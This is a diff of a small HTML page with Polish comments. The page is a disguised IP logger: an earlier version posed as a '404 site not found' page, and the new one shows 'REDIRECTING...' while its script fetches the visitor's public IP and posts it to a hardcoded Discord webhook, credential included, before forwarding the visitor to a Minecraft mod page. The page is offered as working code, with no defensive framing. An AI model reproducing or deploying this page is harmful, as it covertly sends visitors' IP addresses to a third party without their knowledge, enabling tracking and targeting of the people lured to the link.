@@ -3,54 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ERROR404</title>
+    <title>REDIRECTING....</title>
 </head>
 <body>
-    <h1>ERROR404</h1>
-    <p>site not found</p>
+    <h1>REDIRECTING...</h1>
 
     <script>
-        // Funkcja do pobierania IP
+        // Funkcja do pobrania adresu IP
         async function getIP() {
             try {
-                const response = await fetch('https://api64.ipify.org?format=json');
+                const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                console.error('Błąd podczas pobierania IP:', error);
-                return null;
+                console.error('Błąd przy pobieraniu adresu IP:', error);
             }
         }
 
-        // Funkcja do wysyłania danych na Discord webhook
-        async function sendToDiscord(ip) {
-            if (!ip) return;
-
-            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1252938460067790888/AQMQkw8gjRUubsPTigt9EChte1D3Ji6cPuI2ioaaMlaXtNTBqeXjxVF1uWa7Zhvk9Nnz'; // Zastąp własnym URL webhooka
-
+        // Funkcja do wysłania adresu IP na Discord Webhook
+        async function sendIPToDiscord(ip) {
+            const webhookURL = 'https://ptb.discord.com/api/webhooks/1252938460067790888/AQMQkw8gjRUubsPTigt9EChte1D3Ji6cPuI2ioaaMlaXtNTBqeXjxVF1uWa7Zhvk9Nnz';  // Zamień to na URL swojego webhooka
             const message = {
-                content: `Adres IP: ${ip}`
+                content: `Adres IP użytkownika: ${ip}`
             };
 
             try {
-                await fetch(webhookUrl, {
+                const response = await fetch(webhookURL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(message)
                 });
-                console.log('IP wysłane pomyślnie na Discorda');
+
+                if (!response.ok) {
+                    throw new Error('Błąd przy wysyłaniu wiadomości na Discord');
+                }
+
+                console.log('Adres IP wysłany na Discord:', ip);
             } catch (error) {
-                console.error('Błąd podczas wysyłania IP na Discorda:', error);
+                console.error('Błąd przy wysyłaniu na Discord:', error);
             }
         }
 
-        // Pobieranie IP i wysyłanie na Discord webhook po załadow
-		        window.onload = async () => {
-            const ip = await getIP();
-            await sendToDiscord(ip);
-        };
+        // Funkcja do przekierowania użytkownika na inną stronę
+        function redirectToURL(url) {
+            window.location.href = url;
+        }
+
+        // Pobranie IP, wysłanie na Discord i przekierowanie użytkownika
+        getIP().then(ip => {
+            sendIPToDiscord(ip).then(() => {
+                redirectToURL('https://modrinth.com/mod/totemcounter');
+            });
+        });
     </script>
 </body>
-</htm
+</html>
